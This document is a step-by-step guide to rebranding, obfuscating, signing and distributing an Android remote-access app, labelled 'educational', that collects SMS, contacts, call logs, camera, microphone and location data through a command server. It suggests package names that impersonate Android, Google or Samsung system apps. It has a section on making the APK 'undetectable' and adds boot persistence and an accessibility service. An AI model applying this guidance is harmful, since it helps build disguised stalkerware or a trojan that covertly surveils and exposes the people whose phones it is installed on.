# 🎨 APK Customization Guide - Make It Your Own

## 📋 Complete Customization Checklist

### ✅ **1. App Identity**
- [ ] Change app name
- [ ] Change package name
- [ ] Change app icon
- [ ] Change app colors
- [ ] Change splash screen

### ✅ **2. Server Configuration**
- [ ] Update server URL
- [ ] Configure Socket.io endpoint
- [ ] Set API endpoints

### ✅ **3. Permissions**
- [ ] Select required permissions
- [ ] Customize permission requests
- [ ] Update consent screen

### ✅ **4. Obfuscation**
- [ ] Enable ProGuard
- [ ] Configure obfuscation rules
- [ ] Remove debug logs

### ✅ **5. Signing**
- [ ] Generate keystore
- [ ] Configure signing
- [ ] Build release APK

---

## 1️⃣ Change App Name

### **Method 1: Simple Name Change**

**File:** `app/src/main/res/values/strings.xml`
```xml
<resources>
    <!-- CHANGE THIS -->
    <string name="app_name">MyCustomApp</string>
    
    <!-- You can also customize these -->
    <string name="service_title">MyCustomApp Service</string>
    <string name="consent_title">Welcome to MyCustomApp</string>
</resources>
```

### **Method 2: Different Names for Different Languages**

**Create:** `app/src/main/res/values-es/strings.xml` (Spanish)
```xml
<resources>
    <string name="app_name">MiAplicación</string>
</resources>
```

---

## 2️⃣ Change Package Name

### **Step 1: Update build.gradle**

**File:** `app/build.gradle`
```gradle
android {
    defaultConfig {
        // CHANGE THIS - Use your own package name
        applicationId "com.yourcompany.yourapp"
        
        // Examples:
        // applicationId "com.android.system.service"
        // applicationId "com.google.android.update"
        // applicationId "com.samsung.android.app"
        
        minSdkVersion 24
        targetSdkVersion 33
        versionCode 1
        versionName "1.0.0"
    }
}
```

### **Step 2: Refactor Package in Android Studio**

1. Switch to "Project" view (not "Android")
2. Navigate to `app/src/main/java/com/remoteaccess/educational`
3. Right-click on package
4. Select `Refactor > Rename`
5. Choose "Rename package"
6. Enter new package name
7. Click "Refactor"
8. Update all references

### **Step 3: Update AndroidManifest.xml**

**File:** `app/src/main/AndroidManifest.xml`
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.yourcompany.yourapp">  <!-- CHANGE THIS -->
```

---

## 3️⃣ Change App Icon

### **Method 1: Using Android Asset Studio (Recommended)**

1. Go to: https://romannurik.github.io/AndroidAssetStudio/icons-launcher.html
2. Upload your icon image
3. Customize settings
4. Download zip file
5. Extract and replace files in:
   ```
   app/src/main/res/
   ├── mipmap-hdpi/
   ├── mipmap-mdpi/
   ├── mipmap-xhdpi/
   ├── mipmap-xxhdpi/
   └── mipmap-xxxhdpi/
   ```

### **Method 2: Manual Replacement**

Replace these files with your custom icons:
```
app/src/main/res/
├── mipmap-hdpi/ic_launcher.png (72x72)
├── mipmap-mdpi/ic_launcher.png (48x48)
├── mipmap-xhdpi/ic_launcher.png (96x96)
├── mipmap-xxhdpi/ic_launcher.png (144x144)
└── mipmap-xxxhdpi/ic_launcher.png (192x192)
```

### **Method 3: Adaptive Icon (Android 8.0+)**

**File:** `app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml`
```xml
<?xml version="1.0" encoding="utf-8"?>
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@color/ic_launcher_background"/>
    <foreground android:drawable="@mipmap/ic_launcher_foreground"/>
</adaptive-icon>
```

---

## 4️⃣ Change App Colors

### **File:** `app/src/main/res/values/colors.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <!-- Primary Colors - CUSTOMIZE THESE -->
    <color name="colorPrimary">#2196F3</color>
    <color name="colorPrimaryDark">#1976D2</color>
    <color name="colorAccent">#FF4081</color>
    
    <!-- Background Colors -->
    <color name="backgroundColor">#FFFFFF</color>
    <color name="cardBackground">#F5F5F5</color>
    
    <!-- Text Colors -->
    <color name="textPrimary">#212121</color>
    <color name="textSecondary">#757575</color>
    
    <!-- Status Colors -->
    <color name="statusActive">#4CAF50</color>
    <color name="statusInactive">#F44336</color>
    
    <!-- Button Colors -->
    <color name="buttonPrimary">#2196F3</color>
    <color name="buttonSecondary">#9E9E9E</color>
</resources>
```

### **Popular Color Schemes:**

**Material Blue:**
```xml
<color name="colorPrimary">#2196F3</color>
<color name="colorPrimaryDark">#1976D2</color>
<color name="colorAccent">#FF4081</color>
```

**Material Green:**
```xml
<color name="colorPrimary">#4CAF50</color>
<color name="colorPrimaryDark">#388E3C</color>
<color name="colorAccent">#FFC107</color>
```

**Dark Theme:**
```xml
<color name="colorPrimary">#212121</color>
<color name="colorPrimaryDark">#000000</color>
<color name="colorAccent">#FF5722</color>
```

---

## 5️⃣ Configure Server URL

### **File:** `app/src/main/java/.../utils/Constants.java`

```java
package com.yourcompany.yourapp.utils;

public class Constants {
    
    // ========== SERVER CONFIGURATION ==========
    
    // DEVELOPMENT (Local Testing)
    // Use your computer's IP address (not localhost!)
    // Find IP: Windows (ipconfig), Mac/Linux (ifconfig)
    public static final String SERVER_URL_DEV = "http://192.168.1.100:5000";
    
    // PRODUCTION (Deployed Server)
    // Use your domain or server IP
    public static final String SERVER_URL_PROD = "https://yourdomain.com";
    
    // CURRENT SERVER (Change this for dev/prod)
    public static final String SERVER_URL = SERVER_URL_DEV;  // or SERVER_URL_PROD
    
    // ========== SOCKET.IO CONFIGURATION ==========
    public static final String SOCKET_PATH = "/socket.io";
    public static final int SOCKET_TIMEOUT = 10000; // 10 seconds
    
    // ========== API ENDPOINTS ==========
    public static final String API_BASE = SERVER_URL + "/api";
    public static final String API_AUTH = API_BASE + "/auth";
    public static final String API_DEVICES = API_BASE + "/devices";
    
    // ========== APP CONFIGURATION ==========
    public static final String APP_VERSION = "1.0.0";
    public static final int HEARTBEAT_INTERVAL = 30000; // 30 seconds
    
    // ========== PERMISSIONS ==========
    public static final String[] REQUIRED_PERMISSIONS = {
        android.Manifest.permission.INTERNET,
        android.Manifest.permission.ACCESS_NETWORK_STATE,
        android.Manifest.permission.FOREGROUND_SERVICE
    };
    
    public static final String[] OPTIONAL_PERMISSIONS = {
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.SEND_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
}
```

### **Finding Your Local IP:**

**Windows:**
```cmd
ipconfig
# Look for "IPv4 Address" under your network adapter
```

**Mac/Linux:**
```bash
ifconfig
# Look for "inet" under your network interface (en0, wlan0, etc.)
```

**Example:** `192.168.1.100`, `192.168.0.105`, `10.0.0.50`

---

## 6️⃣ Customize Consent Screen

### **File:** `app/src/main/res/values/strings.xml`

```xml
<resources>
    <!-- Consent Screen Customization -->
    <string name="consent_title">Your Custom Title</string>
    
    <string name="consent_description">
        Your custom description here...
    </string>
    
    <string name="terms_content">
        ⚠️ IMPORTANT NOTICE
        
        This application is for EDUCATIONAL purposes only.
        
        FEATURES:
        • Feature 1 description
        • Feature 2 description
        • Feature 3 description
        
        PERMISSIONS REQUIRED:
        • Permission 1 - Why needed
        • Permission 2 - Why needed
        
        BY ACCEPTING YOU AGREE:
        • You own or have permission to use this device
        • You understand all features
        • You will use this responsibly
        
        PRIVACY:
        • Your data is encrypted
        • You can revoke access anytime
        • All actions are logged
        
        For questions: support@yourcompany.com
    </string>
    
    <string name="consent_checkbox">
        I have read and agree to the terms and conditions
    </string>
    
    <string name="btn_accept">Accept &amp; Continue</string>
    <string name="btn_decline">Decline</string>
</resources>
```

---

## 7️⃣ Select Permissions

### **File:** `app/src/main/AndroidManifest.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.yourcompany.yourapp">

    <!-- ========== REQUIRED PERMISSIONS ========== -->
    <!-- These are ALWAYS needed -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <!-- ========== OPTIONAL PERMISSIONS ========== -->
    <!-- Comment out permissions you don't need -->
    
    <!-- SMS Features -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    
    <!-- Contacts -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    
    <!-- Call Logs -->
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    
    <!-- Location -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    
    <!-- Camera & Microphone -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    
    <!-- Storage -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    
    <!-- Vibration -->
    <uses-permission android:name="android.permission.VIBRATE" />
    
    <!-- WiFi -->
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />

    <application
        android:name=".MyApplication"
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme">
        
        <!-- Activities, Services, etc. -->
        
    </application>
</manifest>
```

---

## 8️⃣ Make APK Undetectable

### **A. Enable ProGuard Obfuscation**

**File:** `app/build.gradle`
```gradle
android {
    buildTypes {
        release {
            // Enable obfuscation
            minifyEnabled true
            shrinkResources true
            
            // ProGuard files
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            
            // Disable debugging
            debuggable false
            jniDebuggable false
            
            // Remove logging
            buildConfigField "boolean", "ENABLE_LOGGING", "false"
        }
        
        debug {
            minifyEnabled false
            debuggable true
            buildConfigField "boolean", "ENABLE_LOGGING", "true"
        }
    }
}
```

### **B. ProGuard Rules**

**File:** `app/proguard-rules.pro`
```proguard
# ========== BASIC OBFUSCATION ==========
-repackageclasses ''
-allowaccessmodification
-optimizationpasses 5
-dontusemixedcaseclassnames
-verbose

# ========== KEEP YOUR APP CLASSES ==========
-keep class com.yourcompany.yourapp.** { *; }

# ========== KEEP SOCKET.IO ==========
-keep class io.socket.** { *; }
-keep class okhttp3.** { *; }
-keep class okio.** { *; }

# ========== REMOVE LOGGING ==========
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

# ========== KEEP ANDROID COMPONENTS ==========
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.accessibilityservice.AccessibilityService

# ========== OBFUSCATE STRINGS ==========
-adaptclassstrings
-adaptresourcefilenames
-adaptresourcefilecontents

# ========== OPTIMIZE ==========
-optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*
```

### **C. Remove Debug Code**

**Use BuildConfig to conditionally include debug code:**

```java
if (BuildConfig.ENABLE_LOGGING) {
    Log.d(TAG, "Debug message");
}
```

In release builds, this code will be completely removed.

---

## 9️⃣ Build Release APK

### **Step 1: Generate Keystore**

```bash
cd app
keytool -genkey -v -keystore my-release-key.keystore \
    -alias my-key-alias \
    -keyalg RSA \
    -keysize 2048 \
    -validity 10000
```

**Enter information:**
- Password: (choose strong password - REMEMBER THIS!)
- Name: Your Name
- Organization: Your Company
- City, State, Country

**⚠️ IMPORTANT: Keep this keystore file safe! You need it to update your app.**

### **Step 2: Configure Signing**

**File:** `app/build.gradle`
```gradle
android {
    signingConfigs {
        release {
            storeFile file('my-release-key.keystore')
            storePassword 'YOUR_KEYSTORE_PASSWORD'
            keyAlias 'my-key-alias'
            keyPassword 'YOUR_KEY_PASSWORD'
        }
    }
    
    buildTypes {
        release {
            signingConfig signingConfigs.release
            // ... other release config
        }
    }
}
```

**⚠️ Security Note:** Don't commit passwords to Git!

**Better approach - use gradle.properties:**

**File:** `gradle.properties` (add to .gitignore)
```properties
KEYSTORE_FILE=my-release-key.keystore
KEYSTORE_PASSWORD=your_password
KEY_ALIAS=my-key-alias
KEY_PASSWORD=your_password
```

**File:** `app/build.gradle`
```gradle
android {
    signingConfigs {
        release {
            storeFile file(KEYSTORE_FILE)
            storePassword KEYSTORE_PASSWORD
            keyAlias KEY_ALIAS
            keyPassword KEY_PASSWORD
        }
    }
}
```

### **Step 3: Build APK**

**Using Android Studio:**
```
Build > Generate Signed Bundle / APK
> APK
> Select keystore
> Enter passwords
> Select 'release' build variant
> Finish
```

**Using Command Line:**
```bash
cd android
./gradlew assembleRelease
```

**Output:** `app/build/outputs/apk/release/app-release.apk`

---

## 🔟 Version Management

### **File:** `app/build.gradle`

```gradle
android {
    defaultConfig {
        versionCode 1        // Increment for each release (1, 2, 3...)
        versionName "1.0.0"  // User-visible version (1.0.0, 1.0.1, 1.1.0...)
    }
}
```

**Version naming:**
- `1.0.0` - Major.Minor.Patch
- `1.0.1` - Bug fixes
- `1.1.0` - New features
- `2.0.0` - Major changes

---

## 📱 Testing Customized APK

### **1. Install on Device**
```bash
adb install app/build/outputs/apk/release/app-release.apk
```

### **2. Check Customizations**
- ✅ App name correct?
- ✅ Icon showing properly?
- ✅ Colors as expected?
- ✅ Connects to server?
- ✅ Permissions working?

### **3. Test All Features**
- Device info
- Location
- SMS (if enabled)
- Files
- Camera (if enabled)
- etc.

---

## 🎯 Quick Customization Checklist

```
[ ] Changed app name in strings.xml
[ ] Changed package name in build.gradle
[ ] Refactored package in code
[ ] Replaced app icon
[ ] Updated colors.xml
[ ] Configured server URL in Constants.java
[ ] Customized consent screen
[ ] Selected needed permissions
[ ] Enabled ProGuard
[ ] Generated keystore
[ ] Configured signing
[ ] Built release APK
[ ] Tested on device
```

---

## 🚀 Ready to Deploy!

Your customized APK is now ready! 

**Next steps:**
1. Test thoroughly
2. Deploy backend to production
3. Update server URL in APK
4. Rebuild with production URL
5. Distribute APK

---

**Happy Customizing! 🎨**
